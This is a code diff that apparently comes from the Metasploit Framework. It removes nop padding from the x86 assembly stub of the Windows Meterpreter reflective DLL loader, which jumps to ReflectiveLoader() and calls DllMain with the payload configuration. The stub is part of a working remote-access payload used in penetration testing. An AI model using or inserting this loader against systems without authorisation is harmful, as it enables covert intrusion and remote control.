@@ -37,26 +37,16 @@ module Payload::Windows::MeterpreterLoader
     asm = %Q^
         ; prologue
           dec ebp               ; 'M'
-          nop
-          nop
           pop edx               ; 'Z'
-          nop
-          nop
           call $+5              ; call next instruction
           pop ebx               ; get the current location (+7 bytes)
           push edx              ; restore edx
-          nop
-          nop
           inc ebp               ; restore ebp
           push ebp              ; save ebp for later
           mov ebp, esp          ; set up a new stack frame
           ; Invoke ReflectiveLoader()
-          nop
-          nop
           ; add the offset to ReflectiveLoader() (0x????????)
           add ebx, #{"0x%.8x" % (opts[:rdi_offset] - 7)}
-          nop
-          nop
           call ebx              ; invoke ReflectiveLoader()
         ; Invoke DllMain(hInstance, DLL_METASPLOIT_ATTACH, config_ptr)
           ; offset from ReflectiveLoader() to the end of the DLL
@@ -72,8 +62,6 @@ module Payload::Windows::MeterpreterLoader
     asm << %Q^
           push ebx              ; push the pointer to the configuration start
           push 4                ; indicate that we have attached
-          nop
-          nop
           push eax              ; push some arbitrary value for hInstance
           call eax              ; call DllMain(hInstance, DLL_METASPLOIT_ATTACH, config_ptr)
     ^
